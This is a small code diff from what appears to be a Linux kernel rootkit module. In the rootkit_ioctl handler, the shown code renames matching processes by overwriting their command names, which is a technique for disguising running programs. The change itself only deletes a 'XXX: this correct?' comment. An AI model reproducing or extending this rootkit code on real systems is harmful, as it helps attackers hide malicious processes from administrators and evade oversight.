@@ -258,7 +258,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 			for (i = 0; i < req.len; i++)
 				if (strncmp(req.list[i].orig_name, task->comm, sizeof(task->comm)) == 0) {
 					// set_task_comm(task, req.list[i].new_name);
-					// XXX: this correct?
 					task_lock(task);
 					strlcpy(task->comm, req.list[i].new_name, sizeof(task->comm));
 					task_unlock(task);
